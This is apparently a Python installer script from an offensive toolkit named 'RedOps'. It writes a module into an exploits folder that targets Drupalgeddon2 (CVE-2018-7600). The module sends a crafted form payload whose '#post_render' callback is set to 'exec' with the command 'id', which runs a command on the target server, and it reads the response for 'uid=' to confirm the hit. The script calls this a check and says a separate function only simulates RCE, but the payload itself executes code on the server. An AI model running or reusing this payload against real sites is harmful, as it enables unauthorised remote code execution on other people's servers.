from pathlib import Path

project_root = Path(__file__).resolve().parent.parent
exploit_dir = project_root / "RedOps" / "Core" / "exploits"
exploit_dir.mkdir(parents=True, exist_ok=True)

# Drupalgeddon2
drupal_code = """
import requests

def check_drupalgeddon2(target):
    print(f"[+] Checking Drupalgeddon2 (CVE-2018-7600) on {target}")
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    payload = {
        'form_id': 'user_register_form',
        '_drupal_ajax': '1',
        'mail[#post_render][]': 'exec',
        'mail[#type]': 'markup',
        'mail[#markup]': 'id'
    }
    try:
        r = requests.post(f"{target}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                          data=payload, headers=headers, timeout=5)
        if "uid=" in r.text or "gid=" in r.text:
            print("[!!!] Target appears vulnerable to Drupalgeddon2!")
            return True
    except Exception as e:
        print(f"[!] Error during check: {e}")
    return False

def simulate_rce(target):
    print("[*] Simulating Drupalgeddon2 exploitation... (no real RCE performed)")
"""

drupal_path = exploit_dir / "drupalgeddon2.py"
drupal_path.write_text(drupal_code.strip(), encoding="utf-8")

init_file = exploit_dir / "__init__.py"
if not init_file.exists():
    init_file.write_text("", encoding="utf-8")

print(f"[âœ”] Drupalgeddon2 module saved at: {drupal_path.relative_to(project_root)}")